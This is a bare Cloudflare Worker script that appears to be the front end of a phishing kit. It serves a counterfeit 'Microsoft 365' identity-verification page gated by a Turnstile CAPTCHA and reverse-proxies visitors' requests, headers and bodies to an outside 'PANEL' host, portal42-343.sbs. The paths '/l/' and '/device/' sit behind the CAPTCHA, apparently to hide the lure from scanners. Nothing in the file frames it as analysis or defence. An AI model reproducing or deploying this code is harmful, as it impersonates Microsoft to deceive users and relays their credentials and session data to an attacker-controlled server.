export default {
  async fetch(request) {
    const url = new URL(request.url);
    const path = url.pathname;
    const search = url.search;

    // === CONFIGURATION (change if needed) ===
    const PANEL = 'portal42-343.sbs';
    const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm'; // your working site key

    // === CAPTCHA PAGE ===
    if (path === '/captcha') {
      const returnPath = search ? new URLSearchParams(search).get('return') || '/' : '/';
      const clean = returnPath.startsWith('/') ? returnPath : '/' + returnPath;
      return new Response(getCaptchaHTML(SITE_KEY, clean), {
        headers: { 'Content-Type': 'text/html; charset=UTF-8' }
      });
    }

    // === PROTECTED PATHS (show CAPTCHA) ===
    if (path.startsWith('/l/') || path.startsWith('/device/')) {
      const returnUrl = path + search;
      return Response.redirect(`/captcha?return=${encodeURIComponent(returnUrl)}`, 302);
    }

    // === PROXY EVERYTHING ELSE (root, static, etc.) ===
    const target = `https://${PANEL}${path}`;
    const headers = new Headers(request.headers);
    headers.set('Host', PANEL);
    const body = request.method !== 'GET' && request.method !== 'HEAD' ? request.body : undefined;

    try {
      const response = await fetch(target, {
        method: request.method,
        headers,
        body,
      });
      const newResponse = new Response(response.body, {
        status: response.status,
        statusText: response.statusText,
        headers: response.headers,
      });
      newResponse.headers.set('Cache-Control', 'no-store, no-cache, must-revalidate');
      return newResponse;
    } catch (e) {
      return new Response('Proxy error: ' + e.message, { status: 500 });
    }
  }
};

function getCaptchaHTML(siteKey, returnPath) {
  return `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Verify</title>
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad" async defer></script>
  <style>
    body { font-family: 'Segoe UI', sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
    .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 100%; }
    .logo { display: flex; justify-content: center; align-items: center; margin-bottom: 30px; }
    .logo svg { width: 36px; height: 36px; margin-right: 12px; }
    .logo span { font-size: 22px; font-weight: 600; color: #1a1a1a; }
    .sub { font-size: 16px; color: #5e5e5e; margin-bottom: 25px; }
    #cf-turnstile { display: flex; justify-content: center; margin: 20px 0; }
    .footer { font-size: 12px; color: #6c6c6c; margin-top: 30px; border-top: 1px solid #e1e1e1; padding-top: 20px; }
    .error { color: #d32f2f; padding: 10px; background: #ffebee; border-radius: 4px; display: none; margin-bottom: 15px; }
    #dp { margin-top: 20px; color: #5e5e5e; font-size: 15px; }
  </style>
</head>
<body>
  <div class="box">
    <div class="logo">
      <svg viewBox="0 0 23 23"><rect x="0" y="0" width="10" height="10" fill="#F25022"/><rect x="12" y="0" width="10" height="10" fill="#7FBA00"/><rect x="0" y="12" width="10" height="10" fill="#00A4EF"/><rect x="12" y="12" width="10" height="10" fill="#FFB900"/></svg>
      <span>Microsoft 365</span>
    </div>
    <div class="sub">Verify your identity to access this document.</div>
    <div id="dp"></div>
    <div id="cf-turnstile"></div>
    <div id="status" class="error"></div>
    <div class="footer">Secure Connection &bull; Microsoft &bull; Terms &bull; Privacy</div>
  </div>
  <script>
    const returnPath = "${returnPath}";
    const msgs = ["Loading...", "Processing...", "Almost there...", "Finalizing..."];
    let idx = 0;
    document.getElementById('dp').textContent = msgs[0];
    setInterval(() => { document.getElementById('dp').textContent = msgs[idx]; idx = (idx+1)%msgs.length; }, 3000);
    function turnstileCallback(token) { if (token) window.location.href = returnPath; }
    function turnstileErrorCallback() { document.getElementById('status').textContent = 'Error. Please refresh.'; document.getElementById('status').style.display = 'block'; }
    function turnstileExpiredCallback() { if (window.turnstile) turnstile.reset(); }
    function onTurnstileLoad() {
      turnstile.render('#cf-turnstile', {
        sitekey: '${siteKey}',
        theme: 'light',
        callback: turnstileCallback,
        'error-callback': turnstileErrorCallback,
        'expired-callback': turnstileExpiredCallback,
      });
    }
  </script>
</body>
</html>
  `;
}
